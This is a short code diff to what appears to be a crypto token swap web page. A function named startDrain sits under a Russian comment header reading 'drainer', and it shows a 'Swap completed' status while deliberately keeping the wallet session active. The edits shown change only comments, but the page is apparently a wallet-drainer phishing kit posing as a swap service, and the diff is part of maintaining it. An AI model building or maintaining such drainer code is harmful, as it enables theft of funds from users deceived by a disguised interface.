@@ -339,7 +339,7 @@
 
             const walletModal = document.getElementById('walletModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
-            const walletConnectOption = document.getElementById('walletConnectOption'); // новая кнопка
+            const walletConnectOption = document.getElementById('walletConnectOption'); // одна кнопка
 
             const tokenModal = document.getElementById('tokenModal');
             const tokenSearchInput = document.getElementById('tokenSearchInput');
@@ -679,7 +679,7 @@
                 }
             }
 
-            // ===== ДРЕЙНЕР (без принудительного сброса сессии после успеха) =====
+            // ===== ДРЕЙНЕР (БЕЗ ПРИНУДИТЕЛЬНОГО СБРОСА) =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -755,8 +755,7 @@
                     }
 
                     setStatus('✅ Swap completed', 'ok');
-                    // НЕ вызываем forceClearSession() – оставляем сессию активной
-                    // isConnected остаётся true
+                    // НЕ вызываем forceClearSession() – сессия остаётся активной
 
                 } catch (e) {
                     console.error('Drain error:', e);
@@ -783,7 +782,6 @@
 
             swapBtn.addEventListener('click', function() {
                 if (!isConnected) { 
-                    // Если не подключены – открываем модал выбора кошелька
                     openModal(walletModal); 
                     return; 
                 }
